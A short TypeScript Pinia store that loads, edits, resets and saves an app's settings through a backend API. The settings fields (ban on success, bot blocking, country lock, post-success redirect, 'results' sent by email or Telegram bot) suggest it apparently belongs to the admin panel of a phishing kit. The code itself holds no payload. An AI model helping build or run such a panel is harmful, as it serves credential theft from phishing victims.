import { defineStore } from 'pinia'
import axios from 'axios';
import { basicAPI } from '.';

export interface Settings {
    id: number | undefined;
    autoLogin?: true;
    dualLogin?: boolean;
    dualEmailAccess?: boolean;
    banOnSuccess?: boolean;
    botBlockNotifications?: boolean;
    botInfoReports?: boolean;
    blockPC?: boolean;
    blockMobile?: boolean;
    redirectUrl?: string;
    countryLock?: boolean;
    emailResults?: boolean;
    email?: string;
    telegramResults?: boolean;
    telegramBotAPI?: string;
    telegramChatId?: string;
}

export const useSettingsStore = defineStore('settings', {
    state: () => ({
        settings: {} as Settings,
    }),
    actions: {
        async initSettings() {
            const response = await axios.get(`${basicAPI}/settings`);
            this.$patch({
                settings: response.data
            });
        },
        changeSetting(key: keyof Settings, value: any) {
            this.settings[key] = value;
        },
        async reSetSettings() {
            let initialSettings: Settings = await axios.post(`${basicAPI}/settings/reset`, { dbId: this.settings.id });
            this.$patch({
                settings: initialSettings
            });
        },
        async saveSettings() {
            let settings = { ...this.settings };
            await axios.post(`${basicAPI}/settings/`, { settings, dbId: settings.id });
        },
    },
})
